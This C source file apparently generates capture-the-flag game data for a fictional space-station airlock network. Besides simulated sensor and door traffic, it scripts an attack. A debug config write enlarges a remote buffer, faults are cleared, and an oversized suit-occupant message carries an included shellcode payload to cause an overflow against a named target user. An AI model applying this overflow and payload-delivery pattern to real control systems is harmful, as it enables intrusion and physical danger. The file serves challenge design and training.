#include <assert.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

#include "log.h"
#include "sdn_interface.h"

#include "shellcode.h"

#define YEAR_IN_MS (365 * 24 * 60 * 60 * 1000.0)

#define STATION_PRESSURE_PA 101325

static const sdn_timestamp_t START_TIMESTAMP = (sdn_timestamp_t)(YEAR_IN_MS * 1.989438645);

static uint32_t AIRLOCK_DEVICE_ID = 0xae215d67;
static const uint32_t SDN_DEVICE_ID_DOOR_INNER = 0xae215e12;
static const uint32_t SDN_DEVICE_ID_DOOR_OUTER = 0xae215e13;
static const uint32_t SDN_DEVICE_ID_PRESSURE_CTRL = 0xae215e14;
static const uint32_t SDN_DEVICE_ID_OCCUPANCY_SENSOR = 0xae215e15;
static const uint32_t PATSY_USER_ID = 0xd481aa99;
static const uint32_t TARGET_USER_ID = 0x488504f4;
static const uint32_t REMOTE_DEVICE_1_ID = 0x2017dc71;
static const uint32_t REMOTE_DEVICE_2_ID = 0x3d97134b;

static const uint32_t SDN_DEVICE_ID_CONTROL_PANEL_STATION = 0xae215e16;
static const uint32_t SDN_DEVICE_ID_CONTROL_PANEL_AIRLOCK = 0xae215e17;

static sdn_timestamp_t dummy_timestamp = START_TIMESTAMP;
static float airlock_pressure = STATION_PRESSURE_PA;

static const uint8_t INNER_PRESSURE_ZONE = 0;
static const uint8_t OUTER_PRESSURE_ZONE = 1;

#define SMALL_BUFFER_SIZE 256

const char *SDNMsgTypeToString(SDNMsgType type)
{
    switch (type)
    {
    case SDN_MSG_TYPE_INVALID:
        return "SDN_MSG_TYPE_INVALID";
    case SDN_MSG_TYPE_HEARTBEAT:
        return "SDN_MSG_TYPE_HEARTBEAT";
    case SDN_MSG_TYPE_SENSOR_PRESSURE:
        return "SDN_MSG_TYPE_SENSOR_PRESSURE";
    case SDN_MSG_TYPE_SET_PRESSURE_ZONE:
        return "SDN_MSG_TYPE_SET_PRESSURE_ZONE";
    case SDN_MSG_TYPE_SET_OPEN:
        return "SDN_MSG_TYPE_SET_OPEN";
    case SDN_MSG_TYPE_SET_AIRLOCK_OPEN:
        return "SDN_MSG_TYPE_SET_AIRLOCK_OPEN";
    case SDN_MSG_TYPE_SENSOR_OCCUPANCY:
        return "SDN_MSG_TYPE_SENSOR_OCCUPANCY";
    case SDN_MSG_TYPE_DEBUG_WRITE_CONFIG_INT:
        return "SDN_MSG_TYPE_DEBUG_WRITE_CONFIG_INT";
    case SDN_MSG_TYPE_CLEAR_FAULTS:
        return "SDN_MSG_TYPE_CLEAR_FAULTS";
    case SDN_MSG_TYPE_LOG:
        return "SDN_MSG_TYPE_LOG";
    case SDN_MSG_TYPE_SET_SUIT_OCCUPANT:
        return "SDN_MSG_TYPE_SET_SUIT_OCCUPANT";
    case SDN_MSG_TYPE_CMD_RESPONSE:
        return "SDN_MSG_TYPE_CMD_RESPONSE";
    }

    return "UNKNOWN";
}

static bool LogSDNMessage(char *buffer, size_t buffer_size, const void *msg_buffer)
{
    if (buffer == NULL || buffer_size == 0 || msg_buffer == NULL)
    {
        return false;
    }
    const SDNMsgHeader *header = (const SDNMsgHeader *)msg_buffer;

    char *p = buffer;
    size_t rem = buffer_size;
    int n;

    n = snprintf(p, rem, "%-40s Len: %3u, Dev: 0x%08x, Time: %" PRIu64,
                 SDNMsgTypeToString(header->msg_type), header->msg_length, header->device_id, header->timestamp);
    if (n < 0 || (size_t)n >= rem)
        return false;
    p += n;
    rem -= n;

    switch ((SDNMsgType)header->msg_type)
    {
    case SDN_MSG_TYPE_HEARTBEAT:
    {
        const SDNHeartBeatMessage *msg = (const SDNHeartBeatMessage *)msg_buffer;
        (void)snprintf(p, rem, ", Health: 0x%x", msg->health);
        return false;
    }
    case SDN_MSG_TYPE_SENSOR_PRESSURE:
    {
        const SDNPressureMessage *msg = (const SDNPressureMessage *)msg_buffer;
        (void)snprintf(p, rem, ", ID: %u, Pressure: %.2f Pa", msg->measurement_id, (double)msg->pressure_pa);
        return false;
    }
    case SDN_MSG_TYPE_SET_PRESSURE_ZONE:
    {
        const SDNSetPressureZoneMessage *msg = (const SDNSetPressureZoneMessage *)msg_buffer;
        (void)snprintf(p, rem, ", Zone: %u", msg->zone_id);
        return true;
    }
    case SDN_MSG_TYPE_SET_OPEN:
    {
        const SDNSetOpenMessage *msg = (const SDNSetOpenMessage *)msg_buffer;
        (void)snprintf(p, rem, ", Open: %u", msg->open);
        return true;
    }
    case SDN_MSG_TYPE_SET_AIRLOCK_OPEN:
    {
        const SDNSetAirlockOpenMessage *msg = (const SDNSetAirlockOpenMessage *)msg_buffer;
        (void)snprintf(p, rem, ", Airlock State: %u", msg->open);
        return true;
    }
    case SDN_MSG_TYPE_SENSOR_OCCUPANCY:
    {
        const SDNOccupancyMessage *msg = (const SDNOccupancyMessage *)msg_buffer;
        n = snprintf(p, rem, ", Sensor ID: %u", msg->measurement_id);
        if (n < 0 || (size_t)n >= rem)
            break;
        p += n;
        rem -= n;

        if (header->msg_length >= sizeof(SDNOccupancyMessage))
        {
            size_t num_occupants = (header->msg_length - sizeof(SDNOccupancyMessage)) / sizeof(SDNOccupancyInfo);
            for (size_t i = 0; i < num_occupants; i++)
            {
                n = snprintf(p, rem, ", User: 0x%x, Suit: %u", msg->occupants[i].user_id, msg->occupants[i].suit_status);
                if (n < 0 || (size_t)n >= rem)
                    break;
                p += n;
                rem -= n;
            }
        }
        return true;
    }
    case SDN_MSG_TYPE_DEBUG_WRITE_CONFIG_INT:
    {
        const SDNDebugWriteConfigInt *msg = (const SDNDebugWriteConfigInt *)msg_buffer;
        char key_safe[33];
        memcpy(key_safe, msg->key, 32);
        key_safe[32] = '\0';
        (void)snprintf(p, rem, ", Key: %s, Value: %d", key_safe, msg->value);
        return true;
    }
    case SDN_MSG_TYPE_CLEAR_FAULTS:
    {
        const SDNClearFaultsMessage *msg = (const SDNClearFaultsMessage *)msg_buffer;
        (void)snprintf(p, rem, ", Fault Mask: 0x%x", msg->fault_mask);
        return true;
    }
    case SDN_MSG_TYPE_LOG:
    {
        const SDNLogMessage *msg = (const SDNLogMessage *)msg_buffer;
        if (header->msg_length >= sizeof(SDNLogMessage))
        {
            int str_len = header->msg_length - sizeof(SDNLogMessage);
            (void)snprintf(p, rem, ", Severity: %u, Msg: %.*s", msg->severity, str_len, msg->message_str);
        }
        return true;
    }
    case SDN_MSG_TYPE_SET_SUIT_OCCUPANT:
    {
        const SDNSetSuitOccupantMessage *msg = (const SDNSetSuitOccupantMessage *)msg_buffer;
        n = snprintf(p, rem, ", User: 0x%x", msg->user_id);
        if (n < 0 || (size_t)n >= rem)
            break;
        p += n;
        rem -= n;

        if (header->msg_length >= sizeof(SDNSetSuitOccupantMessage))
        {
            size_t pref_len = header->msg_length - sizeof(SDNSetSuitOccupantMessage);
            (void)snprintf(p, rem, ", Preferences Len: %zu", pref_len);
        }
        return true;
    }
    case SDN_MSG_TYPE_CMD_RESPONSE:
    {
        const SDNResponseMessage *msg = (const SDNResponseMessage *)msg_buffer;
        (void)snprintf(p, rem, ", Response Code: %u", msg->response_code);
        return true;
    }
    case SDN_MSG_TYPE_INVALID:
        return false;
    }
    return false;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool RegisterDevice(uint32_t device_id, SDNDeviceType device_type)
{
    (void)device_id;
    (void)device_type;

    return true;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool BroadcastHeartbeat(uint32_t fault_bits)
{
    (void)fault_bits;
    return true;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
sdn_timestamp_t GetCurrentTimestampMS(void) { return dummy_timestamp; }

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
void SleepMS(unsigned ms) { dummy_timestamp += ms; }

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool SubscribeToMessage(uint32_t device_id, SDNMsgType message_type)
{
    (void)device_id;
    (void)message_type;
    return true;
}

static size_t SendPressure(void *msg_buffer, size_t buffer_size_bytes,
                           uint32_t pressure_device_id, uint32_t measurement_id,
                           float pressure,
                           sdn_timestamp_t *next_pressure_time)
{
    if (buffer_size_bytes >= sizeof(SDNPressureMessage))
    {
        SDNPressureMessage *msg = (SDNPressureMessage *)msg_buffer;
        msg->msg_header.device_id = pressure_device_id;
        msg->msg_header.msg_length = sizeof(SDNPressureMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_SENSOR_PRESSURE;
        msg->msg_header.timestamp = dummy_timestamp;
        msg->measurement_id = measurement_id, msg->pressure_pa = pressure;
        *next_pressure_time += 50;
        return sizeof(SDNPressureMessage);
    }
    else
    {
        sdn_log(SDN_ERROR,
                "ReadNextMessage: buffer too small for SDNPressureMessage");
        return 0;
    }
}

static size_t SendPressureInt1(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_INNER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_1,
                        STATION_PRESSURE_PA, next_time_ms);
}

static size_t SendPressureInt2(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_INNER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_2, airlock_pressure,
                        next_time_ms);
}

static size_t SendPressureExt1(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_OUTER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_1, 0, next_time_ms);
}

static size_t SendPressureExt2(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_OUTER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_2, airlock_pressure,
                        next_time_ms);
}

static size_t SendHeartBeat(void *msg_buffer, size_t buffer_size_bytes,
                            uint32_t device_id, sdn_timestamp_t *next_time)
{
    if (buffer_size_bytes >= sizeof(SDNHeartBeatMessage))
    {
        SDNHeartBeatMessage *msg = (SDNHeartBeatMessage *)msg_buffer;
        msg->msg_header.device_id = device_id;
        msg->msg_header.msg_length = sizeof(SDNHeartBeatMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_HEARTBEAT;
        msg->msg_header.timestamp = dummy_timestamp;
        msg->health = 0, *next_time += 50;
        return sizeof(SDNHeartBeatMessage);
    }
    else
    {
        sdn_log(SDN_ERROR,
                "ReadNextMessage: buffer too small for SDNHeartBeatMessage");
        return 0;
    }
}

static size_t SendHeartBeatInt(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    return SendHeartBeat(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_INNER,
                         next_time_ms);
}

static size_t SendHeartBeatExt(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    return SendHeartBeat(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_OUTER,
                         next_time_ms);
}

static size_t SendAirlockCmd(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms,
                             SDNAirlockOpen open_state)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    if (buffer_size_bytes >= sizeof(SDNSetAirlockOpenMessage))
    {
        SDNSetAirlockOpenMessage *msg = (SDNSetAirlockOpenMessage *)msg_buffer;
        msg->msg_header.device_id = SDN_DEVICE_ID_CONTROL_PANEL_STATION;
        msg->msg_header.msg_length = sizeof(SDNSetAirlockOpenMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_SET_AIRLOCK_OPEN;
        msg->msg_header.timestamp = dummy_timestamp;
        msg->open = open_state;
        return sizeof(SDNSetAirlockOpenMessage);
    }
    else
    {
        sdn_log(SDN_ERROR,
                "ReadNextMessage: buffer too small for SDNSetAirlockOpenMessage");
    }
    return 0;
}

static size_t SendAirlockIntOpenCmd(void *msg_buffer, size_t buffer_size_bytes,
                                    sdn_timestamp_t *next_time_ms)
{
    return SendAirlockCmd(msg_buffer, buffer_size_bytes, next_time_ms,
                          SDN_AIRLOCK_INTERIOR_OPEN);
}

static size_t SendAirlockExtOpenCmd(void *msg_buffer, size_t buffer_size_bytes,
                                    sdn_timestamp_t *next_time_ms)
{
    return SendAirlockCmd(msg_buffer, buffer_size_bytes, next_time_ms,
                          SDN_AIRLOCK_EXTERIOR_OPEN);
}

static size_t SendAirlockCloseCmd(void *msg_buffer, size_t buffer_size_bytes,
                                  sdn_timestamp_t *next_time_ms)
{
    return SendAirlockCmd(msg_buffer, buffer_size_bytes, next_time_ms,
                          SDN_AIRLOCK_CLOSED);
}

static size_t SendLargeBufferSizeConfigCmd(void *msg_buffer,
                                           size_t buffer_size_bytes,
                                           sdn_timestamp_t *next_time_ms)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    if (buffer_size_bytes >= sizeof(SDNDebugWriteConfigInt))
    {
        SDNDebugWriteConfigInt *msg = (SDNDebugWriteConfigInt *)msg_buffer;
        msg->msg_header.device_id = REMOTE_DEVICE_1_ID;
        msg->msg_header.msg_length = sizeof(SDNSetAirlockOpenMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_DEBUG_WRITE_CONFIG_INT;
        msg->msg_header.timestamp = dummy_timestamp;
        strcpy(msg->key, "rx_message_buffer_size");
        msg->value = 2048;
        return sizeof(SDNDebugWriteConfigInt);
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendLargeBufferSizeConfigCmd");
    }
    return 0;
}

static size_t SendAttackCmd(void *msg_buffer, size_t buffer_size_bytes,
                            sdn_timestamp_t *next_time_ms,
                            bool trigger_overflow)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    const size_t MSG_LEN =
        (trigger_overflow)
            ? sizeof(SDNSetSuitOccupantMessage) + sizeof(ATTACK_USER_PREFERENCES)
            : SMALL_BUFFER_SIZE;
    if (buffer_size_bytes >= MSG_LEN)
    {
        SDNSetSuitOccupantMessage *msg = (SDNSetSuitOccupantMessage *)msg_buffer;
        *msg = (SDNSetSuitOccupantMessage){
            {.device_id = SDN_DEVICE_ID_CONTROL_PANEL_AIRLOCK,
             .msg_length = MSG_LEN,
             .timestamp = dummy_timestamp,
             .msg_type = SDN_MSG_TYPE_SET_SUIT_OCCUPANT},
            .user_id = PATSY_USER_ID};
        memcpy(msg->user_preferences, ATTACK_USER_PREFERENCES,
               MSG_LEN - sizeof(SDNSetSuitOccupantMessage));
        return MSG_LEN;
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendLargeBufferSizeConfigCmd");
    }
    return 0;
}

static size_t SendAttackCmd1(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms)
{
    return SendAttackCmd(msg_buffer, buffer_size_bytes, next_time_ms, false);
}

static size_t SendAttackCmd2(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms)
{
    return SendAttackCmd(msg_buffer, buffer_size_bytes, next_time_ms, true);
}

static size_t SendFailureCmd(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    if (buffer_size_bytes >= sizeof(SDNSetSuitOccupantMessage))
    {
        SDNSetSuitOccupantMessage *msg = (SDNSetSuitOccupantMessage *)msg_buffer;
        *msg = (SDNSetSuitOccupantMessage){
            {.device_id = SDN_DEVICE_ID_CONTROL_PANEL_AIRLOCK,
             .msg_length = sizeof(SDNSetSuitOccupantMessage),
             .timestamp = dummy_timestamp,
             .msg_type = SDN_MSG_TYPE_SET_SUIT_OCCUPANT},
            .user_id = TARGET_USER_ID};
        return sizeof(SDNSetSuitOccupantMessage);
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendLargeBufferSizeConfigCmd");
    }
    return 0;
}

static size_t SendClearFaultsCmd(void *msg_buffer, size_t buffer_size_bytes,
                                 sdn_timestamp_t *next_time_ms)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    if (buffer_size_bytes >= sizeof(SDNClearFaultsMessage))
    {
        SDNClearFaultsMessage *msg = (SDNClearFaultsMessage *)msg_buffer;
        *msg = (SDNClearFaultsMessage){
            {.device_id = REMOTE_DEVICE_2_ID,
             .msg_length = sizeof(SDNClearFaultsMessage),
             .timestamp = dummy_timestamp,
             .msg_type = SDN_MSG_TYPE_CLEAR_FAULTS},
            .fault_mask = 0xFFFFFFFF};
        return sizeof(SDNClearFaultsMessage);
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendClearFaultsCmd");
    }
    return 0;
}

typedef size_t (*MessageGenerator)(void *msg_buffer, size_t buffer_size_bytes,
                                   sdn_timestamp_t *next_time_ms);
typedef struct MessageEvent MessageEvent;
struct MessageEvent
{
    sdn_timestamp_t next_time_ms;
    MessageGenerator generator;
};

static MessageEvent message_events[] = {
    {.next_time_ms = 5, .generator = SendHeartBeatInt},
    {.next_time_ms = 5, .generator = SendPressureInt1},
    {.next_time_ms = 5, .generator = SendPressureInt2},
    {.next_time_ms = 6, .generator = SendHeartBeatExt},
    {.next_time_ms = 6, .generator = SendPressureExt1},
    {.next_time_ms = 6, .generator = SendPressureExt2},
    {.next_time_ms = 250, .generator = SendAirlockIntOpenCmd},
    {.next_time_ms = 350, .generator = SendAirlockExtOpenCmd},
    {.next_time_ms = 450, .generator = SendAirlockExtOpenCmd},
    {.next_time_ms = 550, .generator = SendAirlockIntOpenCmd},
    {.next_time_ms = 650, .generator = SendAirlockExtOpenCmd},
    {.next_time_ms = 1000, .generator = SendAirlockCloseCmd},
    {.next_time_ms = 1250, .generator = SendAirlockIntOpenCmd},
    {.next_time_ms = 2000, .generator = SendLargeBufferSizeConfigCmd},
    {.next_time_ms = 2050, .generator = SendClearFaultsCmd},
    {.next_time_ms = 2100, .generator = SendAttackCmd1},
    {.next_time_ms = 2200, .generator = SendAttackCmd2},
    {.next_time_ms = 2300, .generator = SendFailureCmd},
};
static size_t NUM_MESSAGE_EVENTS =
    sizeof(message_events) / sizeof(MessageEvent);

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
int ReadNextMessage(void *msg_buffer, size_t buffer_size_bytes)
{
    for (size_t i = 0; i < NUM_MESSAGE_EVENTS; i++)
    {
        if (dummy_timestamp - START_TIMESTAMP > message_events[i].next_time_ms)
        {
            size_t msg_size = (*message_events[i].generator)(msg_buffer, buffer_size_bytes,
                                                             &message_events[i].next_time_ms);
            char log_buffer[SMALL_BUFFER_SIZE];
            if (LogSDNMessage(log_buffer, SMALL_BUFFER_SIZE, msg_buffer))
            {
                sdn_log(SDN_DEBUG, "<- %s", log_buffer);
            }
            return msg_size;
        }
    }

    return 0;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool ExecuteCmd(const SDNMsgHeader *header, uint32_t target_device_id)
{
    if (target_device_id == SDN_DEVICE_ID_PRESSURE_CTRL &&
        header->msg_type == SDN_MSG_TYPE_SET_PRESSURE_ZONE)
    {
        SDNSetPressureZoneMessage *pressure_cmd =
            (SDNSetPressureZoneMessage *)header;
        if (pressure_cmd->zone_id == INNER_PRESSURE_ZONE)
        {
            airlock_pressure = STATION_PRESSURE_PA;
        }
        else if (pressure_cmd->zone_id == OUTER_PRESSURE_ZONE)
        {
            airlock_pressure = 0;
        }
        else
        {
            sdn_log(SDN_WARN, "Invalid pressure zone");
            return false;
        }
    }

    char log_buffer[SMALL_BUFFER_SIZE];
    LogSDNMessage(log_buffer, SMALL_BUFFER_SIZE, header);
    sdn_log(SDN_DEBUG, "-> %s", log_buffer);

    return true;
}

SDNResponseStatus RequestMessage(void *msg_buffer, size_t buffer_size_bytes,
                                 uint32_t target_device_id,
                                 SDNMsgType request_type)
{
    (void)target_device_id;

    if (request_type == SDN_MSG_TYPE_SENSOR_OCCUPANCY)
    {
        if (buffer_size_bytes >= sizeof(SDNOccupancyMessage))
        {
            SDNOccupancyMessage *msg_ptr = msg_buffer;
            msg_ptr->msg_header.device_id = SDN_DEVICE_ID_OCCUPANCY_SENSOR;
            msg_ptr->msg_header.msg_length = sizeof(SDNOccupancyMessage);
            msg_ptr->msg_header.msg_type = SDN_MSG_TYPE_SENSOR_OCCUPANCY;
            msg_ptr->msg_header.timestamp = dummy_timestamp;
            msg_ptr->measurement_id = 0;
            return SDN_RESPONSE_GOOD;
        }
        else
        {
            sdn_log(SDN_ERROR, "SDN_MSG_TYPE_SENSOR_OCCUPANCY too large %d",
                    sizeof(SDNOccupancyMessage));
            return SDN_RESPONSE_BUFFER_TOO_SMALL;
        }
    }

    sdn_log(SDN_ERROR, "Response request failed");
    return SDN_RESPONSE_FAILED;
}

void SendCmdResponse(uint32_t response_code)
{

    SDNResponseMessage response = {
        .msg_header = {
            .device_id = AIRLOCK_DEVICE_ID,
            .msg_length = sizeof(SDNResponseMessage),
            .msg_type = SDN_MSG_TYPE_CMD_RESPONSE,
            .timestamp = GetCurrentTimestampMS()},
        .response_code = response_code};

    char log_buffer[SMALL_BUFFER_SIZE];
    LogSDNMessage(log_buffer, SMALL_BUFFER_SIZE, &response);
    sdn_log(SDN_DEBUG, "-> %s", log_buffer);
}
